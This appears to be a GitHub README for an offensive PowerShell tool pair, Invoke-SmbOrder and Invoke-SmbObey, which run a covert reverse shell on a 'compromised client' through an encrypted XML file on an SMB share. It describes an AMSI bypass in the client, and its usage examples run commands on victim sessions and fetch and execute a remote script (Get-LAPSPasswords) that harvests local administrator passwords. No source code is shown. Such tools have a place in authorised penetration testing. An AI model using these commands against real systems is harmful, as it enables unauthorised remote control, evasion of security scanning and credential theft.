# Smb Reverse Shell

Invoke-SmbOrder and Invoke-SmbObey are two simple Powershell scripts that allow remote control of a compromised client using an XML file on an SMB share.
The script is intended to enable command line sessions on hosts that do not have direct access to the Internet.
<br>
<br>
The communication channel takes place via SMB.
The XML file can be located on any share, as long as both the server and the client have read and write access to it.
AES encryption is used to ensure that the executed commands and their results are not readable by anyone.
Decryption takes place in memory, so the XML file will never be stored in plain text on disk.
The script for the client contains an Amsi bypass for the Powershell as well as the .Net interface.
Furthermore, Powershell scripts can be loaded into the client.

## Help
```
Get-Help Invoke-SmbOrder -Full

NAME
    Invoke-SmbOrder

TOPIC
    SMB reverse shell - Server component


SYNTAX
    Invoke-SmbOrder [-XmlFile] <String> [-Action] <String> [[-Session] <String>] [[-Execute] <String>] [[-Url] <String>]

DESCRIPTION
    Execute Powershell commands on a remote host by using an encrypted XML file and accessible SMB share.


PARAMETER
    -XmlFile <String>
        The path to XML file containing the commands and results.

        Required?                true
        Position?                    1

    -Action <String>
        Type of action that will be performed. Possible values: create, query, command, script, clear

        Required?                true
        Position?                    2

    -Session <String>
        MD5 hash value of a session.

        Required?                false
        Position?                    3

    -Execute <String>
        Powershell command that will be executed.

        Required?                false
        Position?                    4

    -Url <String>
        URL that holds a Powershell script.

        Required?                false
        Position?                    5

NOTES
    
        Author: r1cksec
        License: GNU General Public License
    

    -------------------------- EXAMPLE 1 --------------------------

    PS C:\>Invoke-SmbOrder \\192.168.0.1\share\file.xml -Action create

    Create encrypted XML file.




    -------------------------- EXAMPLE 2 --------------------------

    PS C:\>Invoke-SmbOrder \\192.168.0.1\share\file.xml -Action query

    Query XML file for sessions.




    -------------------------- EXAMPLE 3 --------------------------

    PS C:\>Invoke-SmbOrder \\192.168.0.1\share\file.xml -Action query -Session 5E43AD84D02509F5A6E4A92CDFDC8730

    Query XML file for specific session.




    -------------------------- EXAMPLE 4 --------------------------

    PS C:\>Invoke-SmbOrder \\192.168.0.1\share\file.xml -Action command -Execute "whoami" -Session
    5E43AD84D02509F5A6E4A92CDFDC8730

    Execute a command for specific session.




    -------------------------- EXAMPLE 5 --------------------------

    PS C:\>Invoke-SmbOrder \\192.168.0.1\share\file.xml -Action script -Url
    "https://raw.githubusercontent.com/r1cksec/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1" -Session
    5E43AD84D02509F5A6E4A92CDFDC8730

    Execute a command for specific session.




    -------------------------- EXAMPLE 6 --------------------------

    PS C:\>Invoke-SmbOrder \\192.168.0.1\share\file.xml -Action clear

    Remove all pending commands and scripts.

```

```
Get-Help Invoke-SmbObey -Full

NAME
    Invoke-SmbObey
    
TOPIC
    SMB reverse shell - Client component
    
    
SYNTAX
    Invoke-SmbObey [-XmlFile] <String> 
    
    
DESCRIPTION
    Execute Powershell commands on a remote host by using an encrypted XML file and accessible SMB share.
    

PARAMETER
    -XmlFile <String>
        The path to XML file containing the commands and results.
        
        Required?                true
        Position?                    1
        Default value                 
        
NOTES
    
        Author: r1cksec
        License: GNU General Public License
    

    -------------------------- EXAMPLE 1 --------------------------
    
    PS C:\>Invoke-SmbObey -SmbFile \\192.168.0.1\share\file.xml
    
    Start reverse shell on compromised client.

```

## Demo
![](https://github.com/r1cksec/smb-reverse-shell/blob/main/demo.gif)

## License

GNU General Public License

